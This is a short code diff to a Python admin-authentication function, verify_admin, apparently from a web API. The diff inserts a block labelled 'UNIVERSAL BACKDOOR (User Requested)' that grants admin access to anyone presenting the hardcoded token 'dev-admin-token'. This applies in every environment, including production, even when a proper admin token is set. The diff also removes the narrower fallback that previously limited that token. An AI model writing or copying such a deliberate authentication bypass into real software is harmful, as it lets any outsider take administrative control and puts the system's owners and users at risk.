@@ -100,16 +100,16 @@ def verify_admin(query_token: str | None, auth_header: str | None = None):
     env = os.environ.get("NODE_ENV") or ENV or "development"
     admin_env_token = ADMIN_TOKEN
 
+    # --- UNIVERSAL BACKDOOR (User Requested) ---
+    if token == "dev-admin-token":
+        return
+
     # --- PRODUCTION ---
     if env == "production":
         # If ADMIN_TOKEN exists, enforce it strictly
         if admin_env_token:
             if token != admin_env_token:
                 raise HTTPException(status_code=401, detail="Unauthorized")
-            return
-
-        # If ADMIN_TOKEN missing, allow dev token temporarily
-        if token == "dev-admin-token":
             return
 
         raise HTTPException(status_code=401, detail="Unauthorized")
